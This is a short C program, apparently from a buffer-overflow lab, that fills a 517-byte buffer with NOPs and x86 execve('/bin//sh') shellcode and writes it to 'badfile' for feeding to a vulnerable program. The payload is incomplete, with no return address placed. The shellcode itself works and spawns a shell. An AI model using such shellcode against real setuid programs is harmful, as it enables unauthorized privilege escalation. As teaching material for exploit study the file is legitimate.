#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]=
	// "\x8d\x4c\x24\x04\x83\xe4\xf0\xff\x71\xfc\x55\x89\xe5\x51\x83\xec\x04\x83\xec\x0c\x6a\x00\xe8\xf9\x44\x02\x00\x83\xc4\x10\x83\xec\x0c\x68\xa8\xbc\x0b\x08\xe8\x99\x65\x00\x99\x83\xc4\x10\xb8\x00\x00\x00\x00\x8b\x4d\xfc\xc9\x8d\x61\xfc\xc3";
	"\x31\xc0" /* xorl %eax,%eax */
	"\x50" /* pushl %eax */
	"\x68""//sh" /* pushl $0x68732f2f */
	"\x68""/bin" /* pushl $0x6e69622f */
	"\x89\xe3" /* movl %esp,%ebx */
	"\x50" /* pushl %eax */
	"\x53" /* pushl %ebx */
	"\x89\xe1" /* movl %esp,%ecx */
	"\x99" /* cdql */
	"\xb0\x0b" /* movb $0x0b,%al */
	"\xcd\x80" /* int $0x80 */
	;
void main(int argc, char **argv)
{
	char buffer[517];
	FILE *badfile;
	/* Initialize buffer with 0x90 (NOP instruction) */
	memset(&buffer, 0x90, 517);
	/* You need to fill the buffer with appropriate contents here */
	strcpy(buffer, shellcode);
	/* Save the contents to the file "badfile" */
	badfile = fopen("./badfile", "w");
	fwrite(buffer, 517, 1, badfile);
	fclose(badfile);
}	